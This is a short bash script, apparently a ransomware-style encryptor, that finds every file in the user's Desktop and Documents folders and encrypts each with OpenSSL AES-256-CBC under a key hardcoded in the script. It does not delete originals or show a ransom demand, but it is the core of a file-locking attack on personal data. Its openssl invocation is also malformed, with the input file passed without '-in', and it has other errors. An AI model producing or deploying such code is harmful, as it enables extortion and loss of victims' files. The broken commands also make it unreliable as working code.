#!/bin/bash

set -euo pipefail

DESKTOP_DIR="$HOME/Desktop"
DOCUMENTS_DIR="$HOME/Documents"

SHA256_PASSWORD="4cfc6666a27d7182247b565967e6b7476f81a62b5c338d694cbe9e929c1da7ff"

encrypt_file(){
	local file="$1"
	local encrypted_file="${file}.encrypt"

	openssl aes-256-cbc -salt -pbkdf2 "$file" -out "$encrypted_file" -k "$SHA256_PASSWORD"

	if [[ $? -eq 0 ]]; then
		echo "$file encrypted successfully"
	else
		echo "$file encryption failed"
	fi
}

find "$DESKTOP_DIR" "$DOCUMENTS_DIR" -type f | while read -r file; do
	encrypt_file $file
done

echo "encryption process complete"


